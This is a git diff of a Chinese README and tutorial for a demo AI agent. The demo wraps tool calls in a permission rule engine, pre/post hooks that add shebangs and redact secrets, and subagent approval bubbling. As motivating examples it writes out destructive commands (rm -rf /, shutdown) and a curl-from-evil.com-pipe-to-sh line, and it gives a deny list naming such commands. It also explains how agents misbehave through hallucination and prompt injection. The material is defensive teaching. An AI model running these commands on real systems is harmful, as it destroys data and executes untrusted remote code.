@@ -1,66 +1,9 @@
-# Demo6 — 约束轴
+# Demo6 — 约束轴：Permission + Hook + 审批冒泡
 
-> 在 demo5 底座（= demo4 × 多 Agent，一路继承到 demo1，只不带 demo3 的 MCP）上叠加「约束轴」：在 LLM 决策和原始工具之间插入**两层 Runtime Control**——可配置、可观测、可拦截，而不是硬编码在某个工具函数里。
->
-> 公式：`demo6 = demo5 底座 × 约束`
+> 在 LLM 决策和原始工具之间插入两层 Runtime Control——Permission 规则引擎（策略层）+ Hook 事件回调（扩展层），可配置、可观测、可拦截，而不是硬编码在某个工具函数里。
+> 本目录是系列的最后一站：demo1–5 一路加能力，demo6 是唯一的转弯——不加能力，加安全围栏；`demo6 = demo5 底座 × 约束`。
 
-## 文档导航
-
-- **[`讲稿.md`](讲稿.md)** — 完整教学讲稿（5 章 + 附录）
-  1. 结论：demo6 多了什么（危险从哪来 + dispatch_tool 四步流程 + 主/子一体受控）
-  2. Permission：声明式规则引擎（allow / deny / ask + ask 层弹层）
-  3. Hook：PreToolUse / PostToolUse 事件回调（改 input / 改 output）
-  4. 审批冒泡：约束 × 多 Agent 的交叉点（挂起 + 队列 + 空闲弹层）
-  5. 局限、演进和总结（配置化 / 审批自动化 / Sandbox / Pi 流派）
-
-概念讲解、设计原理、演进方向全部在讲稿里。本 README 只讲**怎么跑起来**。
-
-## 关键文件
-
-| 文件 | 说明 |
-|---|---|
-| `agent.py` | 主入口：客户端 + 主循环（调 `subagent.run_react_loop`）+ 轮询循环（通知唤醒 + 审批冒泡） |
-| `tools.py` | 工具层（demo1 四件套；execute_bash 加 `run_in_background`，继承 demo5） |
-| `plan.py` / `skill.py` / `ask.py` | 规划轴三件（继承 demo4；ask.py 抽出 `collect()` 供确认层复用） |
-| `subagent.py` | 多 Agent 层：subagent 工具 + 主/子共用 ReAct 循环（继承 demo5；工具执行改走 `dispatch_tool`） |
-| `jobs.py` | 后台任务层：Job 注册表 + 日志 + 通知 + job_kill（继承 demo5） |
-| `tui.py` | TUI 层：行内渲染界面 + ask 弹层（继承 demo5） |
-| `permission.py` | **约束层（★ demo6 新增）**：Permission 规则引擎 + Hook + `dispatch_tool` + 审批冒泡 |
-| `render.py` / `memory.py` / `session.py` / `commands.py` | 渲染 / 记忆 / 会话 / 命令层（继承 demo2-5） |
-| `test_dir/` | 演示材料（启动时自动生成 5 个文件，含明文凭证 db.conf，已 gitignore） |
-| `memory/` / `jobs/` | 运行时生成（已 gitignore；jobs/ 启动时自动清理上次遗留） |
-
-## 设计要点
-
-### 两层 Runtime Control（dispatch_tool 串接）
-
-每次工具调用按顺序过两层，任一层阻断都返回错误给大模型：
-
-| 层 | 抽象 | 实现 | 示例 |
-|---|---|---|---|
-| **Hook**（扩展层 / Lifecycle Extension） | 事件回调 | `HOOKS` 注册表 + Python callable | Pre 注入（写 `.sh` → 补 shebang，改 input）；Post 脱敏（命中密钥 → `[xxxxx]`） |
-| **Permission**（策略层） | 准入决策 | `PERMISSION_RULES` + fnmatch，first-match | `rm -rf *` → deny；`ls *` → allow；其余 → ask |
-
-接入点只有一处：**共用 ReAct 循环的工具执行点**——主 Agent 的 9 个工具和 Subagent 的四件套走同一个安检口，不存在子 Agent 旁路。
-
-### 审批冒泡（Subagent 的 ask）
-
-| 触点 | 线程 | ask 行为 |
-|---|---|---|
-| 主 Agent 前台命令 / 起后台命令 | 主循环 | 同线程直接弹确认层（复用 ask 层 UI） |
-| **Subagent 内部工具** | **后台线程** | 入队 + `Event` 挂起 → 主循环空闲心跳弹层 → 结果回填唤醒（对齐 Claude Code） |
-| 后台 job 进程执行 | 进程 | 无触点——权限只管入口 |
-
-边界：挂起中被 `job_kill` → 醒来按拒绝；管道模式（无交互 UI）→ 自动拒绝；「本会话全允许」由确认层第三选项置位，`/new` 重置。
-
-> 真正的执行隔离（Docker / microVM）属于 Execution Environment，在调用链路之下，不在本 demo 范围——见讲稿第 5 章。
-
-### 与 demo5 的差异
-
-- **新增 `permission.py`**（约束层）+ **subagent.py 一处改动**（工具执行走 dispatch_tool，`run_react_loop` 加 `origin` 参数）+ **agent.py**（心跳加审批分支）+ **ask.py**（抽 `collect()`）+ **commands.py**（/new 重置全允许标记）——其余八个文件逐字节相同
-- 工具集不变（9 个）——约束不是新工具，是工具的安检口
-
-## 运行
+## 快速开始
 
 ### 安装依赖
 
@@ -70,12 +13,19 @@ pip install -r requirements.txt
 
 依赖：`anthropic` / `rich` / `prompt_toolkit`。
 
-### 配置 API Key（同 demo2-5）
+### 配置 API Key
 
-- **环境变量** `ANTHROPIC_API_KEY`（优先，可持久化）
-- 未设 → 启动时交互式输入（仅本次有效）
+网关、模型已在代码里写死，**只需配置 API Key**（同 demo2–5）：
 
-> 注意：与 harness 等其他 provider 共存时需 `env -u ANTHROPIC_AUTH_TOKEN -u ANTHROPIC_BASE_URL ...` 清掉冲突变量（见工作区 CLAUDE.md）。
+1. 环境变量（推荐，可持久化）：
+
+   ```bash
+   export ANTHROPIC_API_KEY=你的智谱Key    # Key 格式 id.secret，在 bigmodel.cn 生成
+   ```
+
+2. 未设环境变量直接运行，会提示输入（不持久化，每次运行都要重输）。
+
+> **注**：与 harness 等其他 provider 共存时需 `env -u ANTHROPIC_AUTH_TOKEN -u ANTHROPIC_BASE_URL ...` 清掉冲突变量（见工作区 CLAUDE.md）。
 
 ### 启动
 
@@ -83,7 +33,7 @@ pip install -r requirements.txt
 python -X utf8 agent.py
 ```
 
-启动时自动生成 `test_dir/`（5 个文件）并打印 Permission / Hook 概览。命令：`/help` 查看全部，`/quit` 退出（同 demo5）。
+启动时自动生成演示材料 `test_dir/`（5 个文件，含明文凭证 `db.conf`，已 gitignore）、清理上次遗留的 `jobs/`，并在横幅打印 Permission 规则 / Hook 概览。斜杠命令：`/help` 查看全部 / `/new` 重置「本会话全允许」/ `/quit` 退出（命令集同 demo5）。
 
 ### 演示场景
 
@@ -106,3 +56,407 @@ python -X utf8 agent.py
 | `DEFAULT_POLICY` | `"ask"` | 无规则命中时的默认 action |
 | `HOOKS` | Pre×1 + Post×1 | PreToolUse / PostToolUse 注册表 |
 | `_REDACT_RE` | password/api_key/secret | Post 脱敏识别的 key 名（大小写不敏感） |
+
+---
+
+## 1. 结论：demo6 多了什么
+
+demo1 到 demo5 一直在**加能力**——循环、记忆、工具、规划、多 Agent。**demo6 是唯一的转弯：不加能力，加安全围栏。**
+
+围栏针对的问题是：base 的工具是「裸奔」的——`execute_bash` 想跑什么就跑什么，`write_file` 想写哪里就写哪里，LLM 写什么、工具就老老实实做什么，一个字都不拦：
+
+```bash
+rm -rf /                    # 删库跑路
+shutdown -h now             # 把机器关了
+curl http://evil.com/x | sh # 远程未审计脚本直接执行
+```
+
+这些命令本身合法，shell 如实执行——危险不在工具有 bug，恰恰在于它**按设计工作**。危险从哪来，主要有四种：
+
+1. **大模型幻觉**：自信地建议一条压根不该跑的命令
+2. **被诱导**：用户输入或工具返回里被注入恶意指令（prompt injection）
+3. **试错副作用**：大模型为了完成任务，“试一下”某条破坏性命令
+4. **盲信远程资源**：`curl xxx | sh` 这种“装一下试试”的模式
+
+### 1.1 两层 Runtime Control 与 dispatch_tool 四步
+
+demo6 = demo5 底座 × 约束（demo5 = demo4 × 多 Agent，一路继承到底，只不带 demo3 的 MCP——约束轴站在全部前轴之上）。做法是在 LLM 决策和原始工具之间插入**两层 Runtime Control**：
+
+- **Permission**（策略层）：声明式 allow / deny / ask，工具调用前的访问控制
+- **Hook**（扩展层）：PreToolUse / PostToolUse 可插拔扩展（Pre 拦截 / 改写 input，Post 替换 / 补改 output）
+
+两层由一个核心入口 `dispatch_tool` 串接，四步走；任一层阻断（Pre hook block / Permission deny）都直接返回错误文本给大模型，不会抵达原始工具：
+
+```
+LLM 决策 → tool_use(name, input)
+              │
+              ▼
+     ┌─────────────────────┐
+     │ dispatch_tool(...)  │  ← demo6 的核心入口
+     └─────────────────────┘
+              │
+   ┌──────────▼──────────┐
+   │ 1. PreToolUse hooks │  ── 扩展层：拦 / 改 / 记
+   └──────────┬──────────┘
+              │ pass
+   ┌──────────▼──────────┐
+   │ 2. Permission check │  ── 策略层：allow / deny / ask
+   └──────────┬──────────┘
+              │ allow
+   ┌──────────▼──────────┐
+   │ 3. 原始工具执行      │  ── demo1 传下来的裸函数
+   └──────────┬──────────┘
+              │
+   ┌──────────▼──────────┐
+   │ 4. PostToolUse hooks│  ── 扩展层：观察 / 替换 / 补改 output
+   └──────────┬──────────┘
+              │
+              ▼
+        结果回灌 LLM
+```
+
+### 1.2 接入点：一处改动，主/子一体受控
+
+dispatch_tool 的接入点只有一处——**共用 ReAct 循环的工具执行点**（`subagent.py` 里 `fn(**args)` 改为 `dispatch_tool(name, args, fn, origin, stop_event)`）。这是 demo5 主/子同构设计的红利：Runtime Control 长在循环上，**主 Agent 的 9 个工具和 Subagent 的四件套走同一个安检口**——不存在“子 Agent 绕过安检”的旁路。
+
+> 真正的执行隔离（Sandbox / Docker / microVM）在调用链路**之下**，属于 Execution Environment——本 demo 不实现，留到 [§5.2](#52-演进方向) 演进方向。
+
+整体维度上，demo6 相对 demo5 的变化：
+
+| 维度 | demo5 | demo6 |
+|---|---|---|
+| **本地工具集** | 9 个 | 9 个（**不变**——约束不是新工具，是工具的安检口） |
+| **记忆 / 会话 / 规划 / 多 Agent / TUI** | ✅ | ✅ **全继承** |
+| **约束轴** | ❌ | ✅ Permission 规则引擎 + Hook + dispatch_tool + 审批冒泡 |
+
+### 1.3 代码层的变化：十二文件 → 十三文件
+
+demo6 在 demo5 十二文件之上新增约束层 `permission.py`，共十三文件——**新增一个层，微调四个文件，其余原样继承（逐字节相同）**：
+
+| 文件 | 职责 | demo6 的变化 |
+|---|---|---|
+| `permission.py` ★新增 | **约束层** | Permission 规则引擎 + Hook + `dispatch_tool` + 审批冒泡 |
+| `agent.py` | 主入口：客户端 + 主循环（调 `subagent.run_react_loop`）+ 轮询循环（通知唤醒 + 审批冒泡） | 主循环 0.5s 心跳加审批分支（空闲时弹审批层）；启动横幅加规则/Hook 信息 |
+| `subagent.py` | 多 Agent 层：subagent 工具 + 主/子共用 ReAct 循环 | 工具执行改走 `dispatch_tool`；`run_react_loop` 加 `origin` 参数（约束层判主/子） |
+| `ask.py` | 提问层（demo4 规划轴三件之一） | 抽出 `collect()` 统一收集入口——确认层与 ask_user_question 共用同一套 UI |
+| `commands.py` | 命令层 | `/new` 重置「本会话全允许」标记 |
+| `tools.py` | 工具层（demo1 四件套；execute_bash 加 `run_in_background`，继承 demo5） | **原样继承** |
+| `plan.py` / `skill.py` | 规划轴（继承 demo4） | **原样继承** |
+| `jobs.py` | 后台任务层：Job 注册表 + 日志 + 通知 + job_kill（继承 demo5） | **原样继承** |
+| `tui.py` | TUI 层：行内渲染界面 + ask 弹层（继承 demo5） | **原样继承** |
+| `render.py` / `memory.py` / `session.py` | 渲染 / 记忆 / 会话层（继承 demo2–5） | **原样继承** |
+| `test_dir/` | 演示材料：启动时自动生成 5 个文件，含明文凭证 db.conf（已 gitignore） | —— |
+| `memory/` / `jobs/` | 运行时生成（已 gitignore；jobs/ 启动时自动清理上次遗留） | —— |
+
+归结成一句话：**能用 prompt 引导的（风格、流程、偏好）放进上下文；绝不能违反的（`rm -rf /`）放进代码**——dispatch 层是 LLM 输出再怎么“越狱”也绕不过的一道闸。
+
+---
+
+## 2. Permission：声明式规则引擎
+
+### 2.1 为什么声明式
+
+一张规则表说清楚“什么能做、什么不能做”——后续方便从外部加载（配置文件化），不用改代码：
+
+```python
+PERMISSION_RULES = [
+    # —— 显式 deny —— 绝不让 LLM 跑的命令（Unix + Windows 原生各一套：
+    #    实测 glm 会按环境选命令——Windows 下写 rmdir /s /q 而不是 rm -rf）
+    ("execute_bash", "rm -rf *",       "deny"),
+    ("execute_bash", "rmdir /s *",     "deny"),
+    ("execute_bash", "rd /s *",        "deny"),
+    ("execute_bash", "format*",        "deny"),
+    ("execute_bash", "mkfs.*",         "deny"),
+    ("execute_bash", "shutdown*",      "deny"),
+    ("execute_bash", "curl *| *sh*",   "deny"),
+
+    # —— 显式 allow —— 安全只读类，免确认
+    ("execute_bash", "ls *",           "allow"),
+    ("execute_bash", "dir *",          "allow"),
+    ("execute_bash", "cat *",          "allow"),
+    ("execute_bash", "grep *",         "allow"),
+
+    # —— 其他 execute_bash：问一下
+    ("execute_bash", "*",              "ask"),
+
+    # —— 文件类工具：默认放行
+    ("read_file",    "*",              "allow"),
+    ("write_file",   "*",              "allow"),
+    ("edit",         "*",              "allow"),
+
+    # —— demo5 继承的派发 / 纯本地工具：放行（真正的把关在各自内部执行时）
+    ("plan",              "*",        "allow"),
+    ("use_skill",         "*",        "allow"),
+    ("ask_user_question", "*",        "allow"),
+    ("subagent",          "*",        "allow"),
+    ("job_kill",          "*",        "allow"),
+]
+
+DEFAULT_POLICY = "ask"
+```
+
+### 2.2 三要素
+
+每条规则是 `(tool_name, pattern, action)` 三元组：
+
+- **tool_name**：作用于哪个工具（demo6 全量 9 个都入了表）
+- **pattern**：`fnmatch` shell 通配符，匹配工具的**关键参数**——`execute_bash` 匹配 `command`，`read_file` / `write_file` / `edit` 匹配 `path`；plan / subagent 这类无关键参数的工具用空串，`"*"` 照样匹配
+- **action**：`allow`（放行）/ `deny`（拒绝）/ `ask`（问用户）
+
+匹配顺序：**从上到下，first-match wins**；没命中走 `DEFAULT_POLICY`。
+
+| 规则 pattern | 匹配的命令示例 | 不匹配的命令示例 |
+|---|---|---|
+| `rm -rf *` | `rm -rf /`、`rm -rf test_dir/` | `rm test.txt`（无 -rf） |
+| `ls *` | `ls -la`、`ls /tmp` | `lsof`、`echo ls` |
+| `*` | 任意 | ——（catch-all） |
+
+### 2.3 ask 的交互：复用 ask 层弹层
+
+`ask` 不再是裸 `input()`——demo6 复用 demo4 的 ask 层 UI（`ask.collect()`）：方向键弹层三选项，**与 ask_user_question 同一套基建**。选「本会话全允许」置位 `_auto_approve_all`，本会话后续 ask 全部静默放行（`/new` 重置）。
+
+### 2.4 实测：deny——命中黑名单，直接拦（管道实测）
+
+```
+❯ 把 test_dir 目录删了
+
+第 1 轮   ⏺ tool_call   | execute_bash({'command': 'rmdir /s /q test_dir'})
+         ✔ tool_return | [Permission 拒绝] execute_bash('rmdir /s /q test_dir') 命中 deny 规则
+第 2 轮   ● assistant   | 这条命令被安全规则拦截了（禁止删除目录）。
+                        如果你确实需要删除 test_dir，可以自己在终端里执行……
+```
+
+模型写的是 **`rmdir /s /q`——Windows 原生命令**，而不是 `rm -rf`：glm 按运行环境自己换了命令，deny 规则因此 Unix / Windows 各写一套。**黑名单的天然盲区**：模型换一种写法，规则就漏一种——这也是 [§5.2](#52-演进方向) Sandbox 兜底存在的原因。
+
+命中 deny——**不执行、也不问用户**。规则取舍的粒度也在这里：删**目录**直接 deny（可能误伤），删单个**文件**落到 ask 问一下——粒度不同，危险等级不同。拒绝原因作为 tool_result 回灌 LLM，LLM 知道这条路堵了，转头建议手动删。
+
+### 2.5 实测：allow——命中白名单，免确认（管道实测）
+
+```
+❯ 看看 test_dir 目录下有什么文件
+
+第 1 轮   ⏺ tool_call   | execute_bash({'command': 'dir test_dir'})
+         ✔ tool_return | 驱动器 D 中的卷是 新加卷
+                        …
+                        D:\...\test_dir 的目录
+                        2026/10/12  21:42    15 a.txt
+                        2026/10/12  21:42    15 b.txt
+                        …（c.log / d.tmp / db.conf / hi.sh）
+第 2 轮   ● assistant   | test_dir 目录下共有 6 个文件，详情如下：
+                        （文件名 / 大小 / 类型表格，末尾问要不要看某个文件的内容）
+```
+
+两个真实细节：①模型写的是 **`dir` 不是 `ls`**——Windows 下没有 ls，模型自然换平台命令，规则表 `ls *` / `dir *` 都写了所以照样命中 allow；②`dir` 的输出是 **GBK 编码**的中文，execute_bash 解码走 utf-8 → GBK 回退（与 read_file 同款），tool_return 才是可读中文。
+
+命中 allow——**静默放行**，连提示都不打：频繁的只读操作（dir / cat / grep）不会被 ask 打断。Permission 的打扰是分层的，只读免问、危险直拒、中间地带才问人。
+
+### 2.6 实测：ask——落到 catch-all，问用户
+
+```
+❯ 把 test_dir 里的 a.txt 删了
+
+第 1 轮   ⏺ tool_call   | execute_bash({'command': 'del test_dir\\a.txt'})
+
+         ┌ 弹层（选完即擦除，故轨迹里看不到）────────────
+         │ 主 Agent 请求执行 execute_bash
+         │ ❯ 允许        —— del test_dir\a.txt
+         │   拒绝        —— 返回拒绝说明，Agent 自行换方式完成
+         │   本会话全允许 —— 本次起本会话内的确认全部自动放行
+         └──────────────────────────────────────
+         ✔ tool_return | [命令执行成功，无输出]
+第 2 轮   ● assistant   | 已经删除了 test_dir 目录下的 a.txt。
+```
+
+`del test_dir\a.txt`（又是 Windows 原生命令）不匹配 deny 也非只读 allow——**删单个文件介于两者之间**，落到 catch-all `("execute_bash", "*", "ask")` 弹层确认。与 §2.4 合起来正是粒度谱系：删**目录**直拒、删单**文件**问一下、只读命令放行。三种 action 里 ask 是兜底：**拿不准就交给人类**。
+
+---
+
+## 3. Hook（Lifecycle Extension）：事件回调
+
+Runtime Control 的第二层是 Hook。Claude Code 把它叫 hook，概念上它是 **Lifecycle Extension**——在工具调用的生命周期点（执行前 / 执行后）插一段自定义逻辑：拦、改、记、补。
+
+### 3.1 Hook 事件类型
+
+| 事件 | 时机 | 能做什么 | 典型场景 |
+|---|---|---|---|
+| **PreToolUse** | 工具执行**前** | 拦（block）/ 改（modify_input）/ 放（pass） | 敏感词拦截、参数脱敏、写入增强 |
+| **PostToolUse** | 工具执行**后** | 观察、记录、**替换 / 补改 output** | 敏感输出脱敏、输出校验（type check / 格式检查） |
+
+输出校验还有个延伸用法：Post 检查工具结果**不合格**（格式不对、任务没做完），通过 `output_delta` 把意见附在结果末尾打回去——模型读到「不合格 + 原因」，下一轮继续改，直到检查通过。检查和执行分离，检查本身也是可插拔的。
+
+### 3.2 两个示例 hook：一个改 input，一个改 output
+
+- **hook_inject_shebang**（Pre）：**写时增强**——检测到 `write_file` 写 `.sh` 脚本，若开头没有 shebang 就补一行 `#!/bin/bash`。改的是**落盘的真实内容**
+- **hook_scan_output**（Post）：**读时脱敏**——把输出里的密钥替换成 `[xxxxx]`，再补「已脱敏」提示。改的是**回灌 LLM 的内容**，文件本身没动
+
+```python
+def hook_inject_shebang(tool_name: str, tool_input: dict) -> dict:
+    if tool_name != "write_file":
+        return {"decision": "pass"}
+    path = tool_input.get("path", "")
+    if not path.endswith(".sh"):                  # 只管 .sh 脚本
+        return {"decision": "pass"}
+    content = tool_input.get("content", "")
+    if content.startswith("#!"):                  # 已有 shebang 就不重复加
+        return {"decision": "pass"}
+    new_input = dict(tool_input)
+    new_input["content"] = "#!/bin/bash\n" + content
+    return {"decision": "modify", "modified_input": new_input,
+            "message": "Hook 注入：已在开头补上 #!/bin/bash shebang"}
+```
+
+```python
+_REDACT_RE = re.compile(
+    r'((?:password|api_key|apikey|secret)\s*[:=]\s*)\S+', re.IGNORECASE)
+
+def hook_scan_output(tool_name, tool_input, tool_output: str) -> dict:
+    redacted, n = _REDACT_RE.subn(r"\1[xxxxx]", tool_output)
+    if n == 0:
+        return {"message": "no secrets detected", "output_delta": ""}
+    delta = f"\n\nℹ️ [Post hook] 输出含疑似凭证，已将 {n} 处敏感值脱敏为 [xxxxx]。"
+    return {"message": f"redacted {n}", "modified_output": redacted, "output_delta": delta}
+```
+
+Post 拿到工具输出（如 `read_file` 读回的原文），把 `password=hunter2` 换成 `password=[xxxxx]`。两个返回字段：**`modified_output`** 让 dispatch_tool **替换**整个 tool_result；**`output_delta`** 在末尾**追加**提示。一替换、一追加——真密钥没进 LLM 的视野。
+
+`run_hooks` 聚合器（Pre 的 modify 链式改写、block 立即终止；Post 收集 delta、取最后一个 modified_output）与 HOOKS 注册表都在 `permission.py`，结构与 demo5 的 Job 注册表同款——一张表 + 一个调度函数。
+
+### 3.3 实测：Hook 注入——Pre 改写 input，LLM 浑然不觉
+
+```
+❯ 在 test_dir 下写个 hi.sh，内容是 echo hello
+
+第 1 轮   ⏺ tool_call   | write_file({'path': 'test_dir\\hi.sh', 'content': 'echo hello\n'})
+         ✔ tool_return | [成功] 文件已写入: test_dir\hi.sh (23 字符)
+第 2 轮   ● assistant   | 已在 test_dir 下创建 hi.sh，内容为 `echo hello`。
+```
+
+铁证就在字符数里：模型写的 content 是 `'echo hello\n'`——**11 个字符**，tool_return 却报 **23 字符**：差的 12 个正是 Pre hook 静默补上的 `#!/bin/bash\n`。而模型的最终回复仍是“内容为 echo hello”——tool_result 里**没有任何「输入被改了」的信号**，它坚信文件里就是自己写的那一行。实际落盘：
+
+```bash
+#!/bin/bash
+echo hello
+```
+
+### 3.4 实测：Post 把读出的密钥脱敏
+
+```
+❯ 读一下 test_dir/db.conf 的内容
+
+第 1 轮   ⏺ tool_call   | read_file({'path': 'test_dir\\db.conf'})
+         ✔ tool_return | db_host=db.example.com
+                        api_key=[xxxxx]
+                        password=[xxxxx]
+                        ℹ️ [Post hook] 输出含疑似凭证，已将 2 处敏感值脱敏为 [xxxxx]。
+第 2 轮   ● assistant   | test_dir/db.conf 的内容如下：db_host / api_key / password……
+                        api_key 和 password 两个敏感字段已被自动脱敏显示为 [xxxxx]。
+```
+
+文件在盘上原样未动（真值还在），Post 改的只是回灌给 LLM 的那串字符串——LLM 看不到真值，也就没法外传；「已脱敏」提示让模型知道自己被脱敏了（三层谱系的 Post 侧，见 §3.5）。
+
+### 3.5 Pre 改 input、Post 改 output——边界在哪
+
+关键看改的是「真实世界」还是「LLM 的认知」：
+
+- **Pre 改 input = 改真实世界**。input 是执行前的参数，改了它，写进文件的内容、跑的命令**真的变了**。代价也在这里：改动真实生效，得想清楚改得对不对
+- **Post 改 output = 改 LLM 的认知**。output 是执行后的结果，木已成舟——Post 改的只是回灌的那串字符串，真实世界分毫未动
+
+所以「写时增强文件」只能在 Pre（要赶在落盘前），「读时对 LLM 脱敏」只能在 Post（read 的 input 只有 path，Pre 够不到读出的内容）。两个 hook 各占生命周期的一端，不是重复。
+
+还有一个对照：**三层里模型各知道多少**——Permission 的 deny 一定被 LLM 察觉（收到拒绝文本，下一轮换招）；Pre hook 的 modify 对 LLM 完全透明（tool_result 无信号，它坚信自己写的原样落盘）；Post hook 介于中间——脱敏后的内容和「已脱敏」提示都会回灌，模型**知道发生了脱敏，但看不到真值**。一个明着拦、一个暗着改、一个看得见结果看不见真值——控制力度的三种谱系。
+
+---
+
+## 4. 审批冒泡：约束 × 多 Agent 的交叉点
+
+demo6 站在 demo5 之上，第一个交叉问题随之而来：**Subagent 的工具调用也要过安检——那它的 `ask` 弹给谁？**
+
+主 Agent 没有这个问题：ask 发生在前台轮次里，同线程直接弹层。**Subagent 不行**——它在后台线程里跑，弹层不能从后台线程操作；且它需要审批的那一刻完全随机，直接弹等于按子 Agent 的节奏随机打断你。
+
+三种触点的 ask 行为：
+
+| 触点 | 线程 | ask 行为 |
+|---|---|---|
+| 主 Agent 前台命令 / 起后台命令 | 主循环 | 同线程直接弹确认层（复用 ask 层 UI） |
+| **Subagent 内部工具** | **后台线程** | 入队 + `Event` 挂起 → 主循环空闲心跳弹层 → 结果回填唤醒（对齐 Claude Code） |
+| 后台 job 进程执行 | 进程 | 无触点——权限只管入口 |
+
+### 4.1 机制：挂起 + 轮询 + 审批
+
+解法是**审批冒泡**——本质就是「挂起 + 轮询 + 审批」，和 demo5 的通知闭环共用同一个 0.5s 空闲心跳：
+
+```
+子 Agent 线程（工具执行点命中 ask）
+  → PendingApproval 入队（list + 锁）
+  → event.wait(0.5) 循环挂起          ← 子循环整条线程停在这，不烧 token
+     │                                  每圈顺查 stop_event（被 job_kill 则醒来按拒绝）
+     ▼
+主循环 0.5s 心跳（空闲时）
+  → has_pending_approval() → resolve_pending_approval()
+  → 弹确认层（ask 层 UI：「Subagent「xx」 请求执行 execute_bash」）
+  → 用户选择 → 结果回填 + event.set()
+     │
+     ▼
+子 Agent 线程醒来 → 按结果继续执行，或收到拒绝文本自行换路子
+```
+
+和通知闭环互为镜像：**通知是 job → 模型的单向注入，审批是 job → 用户 → job 的往返**。两个边界一句话：挂起中被 `job_kill` → 醒来按拒绝；管道模式（无交互 UI）→ 自动拒绝——都保守正确。
+
+### 4.2 实测：冒泡全链路（拒绝路径）
+
+```
+❯ 派一个 Subagent 去跑 python -c "print(456)" 并告诉我结果
+
+第 1 轮   ⏺ tool_call   | subagent({'role': '命令执行者',
+                        'task': '请在 shell 中执行命令：python -c "print(456)"…'})
+         ✔ tool_return | [Subagent · 命令执行者] 已放入后台运行，job id: ahwj67poc…
+第 2 轮   ● assistant   | 已派出 Subagent 去执行该命令，完成后我会收到通知并告诉你结果。
+
+（子 Agent 后台跑：execute_bash 命中 ask → 入队挂起 → 主循环空闲心跳弹审批层
+  「Subagent「命令执行者」 请求执行 execute_bash」→ 用户选【拒绝】→ 子线程醒来收到拒绝）
+
+         ✔ tool_return | [后台] 后台 Subagent「命令执行者…」已完成（jobs/ahwj67poc.log）
+第 3 轮   ● assistant   | Subagent 跑完了，但它反馈该命令未被允许执行。
+                        我来直接读一下它的输出日志确认情况：
+         ⏺ tool_call   | read_file({'path': '...\\jobs\\ahwj67poc.log'})
+         ✔ tool_return | === Subagent ahwj67poc === … [Permission 拒绝] …
+第 4 轮   ● assistant   | Subagent 的执行被安全策略拒绝了。如果你确实需要真实输出，
+                        可以由我这边直接执行（会再向你确认），要我再跑一次吗？
+```
+
+**关键观察**：
+
+1. **弹层出现在主循环空闲后约 0.5 秒**——派发轮（第 1-2 轮）期间子 Agent 还没跑到工具调用，主 Agent 先 end_turn，审批层才有机会弹
+2. **拒绝文案是引导**：「请换不需要审批的方式完成任务，或在报告中说明这一步没有做」——子 Agent 如实把拒绝写进了报告
+3. **`已完成` ≠ 执行成功**——job 的 status 只描述生命周期（循环正常跑完），成败真相在 `<result>` 报告里，主 Agent 读报告（甚至去读日志）判断
+4. **主 Agent 接管也要过安检**——它提议“由我直接执行”后若真跑，走前台 direct 弹层再问一次用户。约束没有因为换人执行而放松
+
+---
+
+## 5. 局限、演进和总结
+
+### 5.1 demo6 实现了什么
+
+demo5 的全部能力之上，在共用循环的工具执行点插入 `dispatch_tool`，串起两层 Runtime Control——**主/子一体受控，LLM 绕不过去**。约束落在代码层，不靠 prompt 引导。
+
+### 5.2 演进方向
+
+1. **Permission 配置化**——规则是 Python 列表硬编码（改一次重启一次）；生产级从 YAML / JSON 加载，支持企业 / 项目 / 用户 / 会话多级叠加。黑名单也有盲区：`write_file` 全 allow，写关键文件不受限，生产级要配白名单或写入审计
+2. **审批自动化**——demo6 的 ask 全部问人；生产级可加一层自动化：一个 classifier（小模型）先替用户审查“该不该放行”，拿不准才冒泡给人。Claude Code 的 permission modes（default / acceptEdits / bypassPermissions）是同方向的分层放宽
+3. **Hook 扩展到更多生命周期点**——demo6 只有 Pre/PostToolUse；生产级还有 SessionStart / UserPromptSubmit / PreCompact / Stop 等
+4. **Sandbox 独立执行环境**——demo6 止于 Runtime Control，`execute_bash` 直接跑在宿主机；生产级在链路之下再叠一层隔离（Docker / microVM）。它是和 Permission **正交的第三个维度**、兜底关系而非替代：Permission 是事前的规则判断，规则可能漏掉新的危险命令；Sandbox 是事后的物理隔离——即便漏判，`rm -rf /` 也只在沙箱里炸
+
+> 更激进的一派（开源 harness **Pi**）干脆不做内置 Permission：规则判断终究会漏，不如把约束整个推给容器化，harness 自身保持极简。内建规则层（demo6）、纯外置隔离（Pi）、夹在中间的编辑审批，三种立场都合法——Permission 是设计选择而非唯一正解。
+
+### 5.3 总结
+
+收束成公式：
+
+```
+demo1:  base = LLM × 工具 × 循环 × 状态
+demo6:  = demo5 底座 × 约束                （Permission + Hook + 审批冒泡）
+```
+
+demo1 到 demo5 加能力，demo6 加约束——六条轴合起来，就是一个完整 Agent 的全部横切关注点。
+
+> 轴覆盖的权威矩阵见仓库根目录 [README](../README.md)「轴清单 × 内容矩阵」。
